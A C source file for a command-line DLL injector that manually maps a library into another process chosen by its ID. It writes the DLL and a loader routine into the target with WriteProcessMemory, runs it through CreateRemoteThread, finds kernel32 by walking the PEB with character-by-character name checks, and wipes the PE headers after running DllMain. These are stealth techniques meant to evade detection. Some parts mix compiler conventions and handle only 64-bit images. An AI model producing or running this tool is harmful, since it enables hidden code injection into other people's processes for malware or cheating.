#include <windows.h>
#include <tlhelp32.h>
#include "ntstructs.h"
#include <intrin.h>

// Manual mapper - no LoadLibrary, no LdrLoadDll
// Maps DLL sections, fixes relocations, resolves imports, calls entry

typedef struct {
    PVOID ImageBase;
    PVOID NtHeaders;
    PVOID BaseReloc;
    PVOID ImportDir;
    PVOID EntryPoint;
} MANUAL_MAP_DATA;

typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);

// Shellcode that runs in target process
__attribute__((section(".map")))
void __stdcall Loader(MANUAL_MAP_DATA *pData) {
    if (!pData) return;

    BYTE *pBase = (BYTE*)pData->ImageBase;
    IMAGE_NT_HEADERS *pNT = (IMAGE_NT_HEADERS*)pData->NtHeaders;
    IMAGE_OPTIONAL_HEADER *pOpt = &pNT->OptionalHeader;

    // Get kernel32 functions (PEB walk)
    PEB *pPEB;
#ifdef _WIN64
    pPEB = (PEB*)__readgsqword(0x60);
#else
    pPEB = (PEB*)__readfsdword(0x30);
#endif

    LIST_ENTRY *pHead = &pPEB->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *pCurrent = pHead->Flink;
    HMODULE hKernel32 = NULL;

    // Find kernel32.dll (not KERNELBASE!)
    while (pCurrent != pHead) {
        LDR_DATA_TABLE_ENTRY *pLdr = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pCurrent - sizeof(LIST_ENTRY));
        if (pLdr->BaseDllName.Buffer) {
            WCHAR *name = pLdr->BaseDllName.Buffer;
            // Check for KERNEL32: 'k' 'e' ... '3' '2'
            if ((name[0] | 0x20) == 'k' &&
                (name[1] | 0x20) == 'e' &&
                name[6] == '3' &&
                name[7] == '2') {
                hKernel32 = (HMODULE)pLdr->DllBase;
                break;
            }
        }
        pCurrent = pCurrent->Flink;
    }

    if (!hKernel32) return;

    // Get exports from kernel32
    BYTE *pK32 = (BYTE*)hKernel32;
    IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)pK32;
    IMAGE_NT_HEADERS *pNtK = (IMAGE_NT_HEADERS*)(pK32 + pDos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *pExp = (IMAGE_EXPORT_DIRECTORY*)(pK32 +
        pNtK->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *pNames = (DWORD*)(pK32 + pExp->AddressOfNames);
    WORD *pOrds = (WORD*)(pK32 + pExp->AddressOfNameOrdinals);
    DWORD *pFuncs = (DWORD*)(pK32 + pExp->AddressOfFunctions);

    pLoadLibraryA fnLoadLibraryA = NULL;
    pGetProcAddress fnGetProcAddress = NULL;

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        char *name = (char*)(pK32 + pNames[i]);
        if (name[0] == 'L' && name[4] == 'L' && name[7] == 'r') // LoadLibraryA
            fnLoadLibraryA = (pLoadLibraryA)(pK32 + pFuncs[pOrds[i]]);
        if (name[0] == 'G' && name[3] == 'P' && name[7] == 'A') // GetProcAddress
            fnGetProcAddress = (pGetProcAddress)(pK32 + pFuncs[pOrds[i]]);
    }

    if (!fnLoadLibraryA || !fnGetProcAddress) return;

    // Process relocations
    ULONGLONG delta = (ULONGLONG)(pBase - pOpt->ImageBase);
    if (delta && pData->BaseReloc) {
        IMAGE_BASE_RELOCATION *pReloc = (IMAGE_BASE_RELOCATION*)pData->BaseReloc;
        while (pReloc->VirtualAddress) {
            WORD *pEntry = (WORD*)(pReloc + 1);
            DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (DWORD i = 0; i < count; i++) {
                if ((pEntry[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG *pPatch = (ULONGLONG*)(pBase + pReloc->VirtualAddress + (pEntry[i] & 0xFFF));
                    *pPatch += delta;
                }
            }
            pReloc = (IMAGE_BASE_RELOCATION*)((BYTE*)pReloc + pReloc->SizeOfBlock);
        }
    }

    // Resolve imports
    if (pData->ImportDir) {
        IMAGE_IMPORT_DESCRIPTOR *pImport = (IMAGE_IMPORT_DESCRIPTOR*)pData->ImportDir;
        while (pImport->Name) {
            char *modName = (char*)(pBase + pImport->Name);
            HMODULE hMod = fnLoadLibraryA(modName);

            ULONGLONG *pThunk = (ULONGLONG*)(pBase + pImport->OriginalFirstThunk);
            ULONGLONG *pIAT = (ULONGLONG*)(pBase + pImport->FirstThunk);

            while (*pThunk) {
                if (*pThunk & IMAGE_ORDINAL_FLAG64) {
                    *pIAT = (ULONGLONG)fnGetProcAddress(hMod, (LPCSTR)(*pThunk & 0xFFFF));
                } else {
                    IMAGE_IMPORT_BY_NAME *pName = (IMAGE_IMPORT_BY_NAME*)(pBase + *pThunk);
                    *pIAT = (ULONGLONG)fnGetProcAddress(hMod, pName->Name);
                }
                pThunk++;
                pIAT++;
            }
            pImport++;
        }
    }

    // Call DllMain
    if (pData->EntryPoint) {
        DllMain_t pEntry = (DllMain_t)pData->EntryPoint;
        pEntry((HINSTANCE)pBase, DLL_PROCESS_ATTACH, NULL);
    }

    // Wipe PE headers
    for (DWORD i = 0; i < pOpt->SizeOfHeaders; i++)
        pBase[i] = 0;
}

void _start(void) {
    // Usage: injector.exe <PID> <DLL_PATH>

    LPWSTR cmdLine = GetCommandLineW();

    // Skip exe name
    while (*cmdLine && *cmdLine != ' ') cmdLine++;
    while (*cmdLine == ' ') cmdLine++;

    // Parse PID
    DWORD pid = 0;
    while (*cmdLine >= '0' && *cmdLine <= '9') {
        pid = pid * 10 + (*cmdLine - '0');
        cmdLine++;
    }
    while (*cmdLine == ' ') cmdLine++;

    // cmdLine now points to DLL path (wide string)
    if (!pid) {
        ExitProcess(1);
    }

    // Read DLL file
    HANDLE hFile = CreateFileW(cmdLine, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) ExitProcess(2);

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *pFile = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, pFile, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Parse PE
    IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)pFile;
    IMAGE_NT_HEADERS *pNT = (IMAGE_NT_HEADERS*)(pFile + pDos->e_lfanew);
    IMAGE_OPTIONAL_HEADER *pOpt = &pNT->OptionalHeader;
    IMAGE_SECTION_HEADER *pSec = IMAGE_FIRST_SECTION(pNT);

    // Open target process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) ExitProcess(3);

    // Allocate in target
    BYTE *pTarget = (BYTE*)VirtualAllocEx(hProc, NULL, pOpt->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pTarget) ExitProcess(4);

    // Write headers
    WriteProcessMemory(hProc, pTarget, pFile, pOpt->SizeOfHeaders, NULL);

    // Write sections
    for (WORD i = 0; i < pNT->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData) {
            WriteProcessMemory(hProc, pTarget + pSec[i].VirtualAddress,
                pFile + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, NULL);
        }
    }

    // Setup loader data
    MANUAL_MAP_DATA mapData = {0};
    mapData.ImageBase = pTarget;
    mapData.NtHeaders = pTarget + pDos->e_lfanew;

    if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
        mapData.BaseReloc = pTarget + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
        mapData.ImportDir = pTarget + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (pOpt->AddressOfEntryPoint)
        mapData.EntryPoint = pTarget + pOpt->AddressOfEntryPoint;

    // Write loader shellcode
    BYTE *pLoader = (BYTE*)VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, pLoader, (PVOID)Loader, 0x800, NULL);

    // Write map data
    MANUAL_MAP_DATA *pRemoteData = (MANUAL_MAP_DATA*)(pLoader + 0x800);
    WriteProcessMemory(hProc, pRemoteData, &mapData, sizeof(mapData), NULL);

    // Use CreateRemoteThread (simpler, more reliable)
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoader, pRemoteData, 0, NULL);
    if (!hThread) ExitProcess(5);

    // Wait for loader to finish
    WaitForSingleObject(hThread, 5000);

    CloseHandle(hThread);
    CloseHandle(hProc);
    VirtualFree(pFile, 0, MEM_RELEASE);

    ExitProcess(0);
}
